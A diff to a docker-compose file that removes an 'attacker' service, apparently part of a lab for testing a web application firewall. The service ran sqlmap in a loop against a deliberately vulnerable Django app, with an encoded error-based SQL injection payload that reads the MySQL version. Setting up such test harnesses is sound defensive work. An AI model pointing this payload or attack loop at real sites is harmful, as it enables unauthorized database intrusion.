@@ -25,33 +25,6 @@ services:
     volumes:
       - .:/app:ro
 
-  attacker:
-    image: parrotsec/sqlmap@sha256:aa7836c15d5ac7562b611f0cae73920e45c9efcb5a98be60a12aa3ea927082ff
-    entrypoint: ["/bin/bash", "-c"]
-    command:
-      - |
-        while true; do
-          if curl --silent --fail --max-time 1 \
-            'http://host.docker.internal:8081/vuln/?order=id' >/dev/null; then
-            target=http://host.docker.internal:8081
-            echo "LaTaupe detected: attacking through the WAF"
-          else
-            target=http://vulnerable:8000
-            echo "LaTaupe unavailable: attacking Django directly"
-          fi
-          sqlmap -u "$${target}/vuln/?order=vuln_collection.name%29%3Bselect%20updatexml%281%2Cconcat%280x7e%2C%28select%20%40%40version%29%29%2C1%29%23" \
-            --batch --dbms=MySQL --level=1 --risk=1 --flush-session || true
-          sleep 15
-        done
-    depends_on:
-      vulnerable:
-        condition: service_healthy
-    extra_hosts:
-      - "host.docker.internal:host-gateway"
-    networks:
-      - frontend
-    restart: unless-stopped
-
   database:
     image: mysql@sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
     environment:
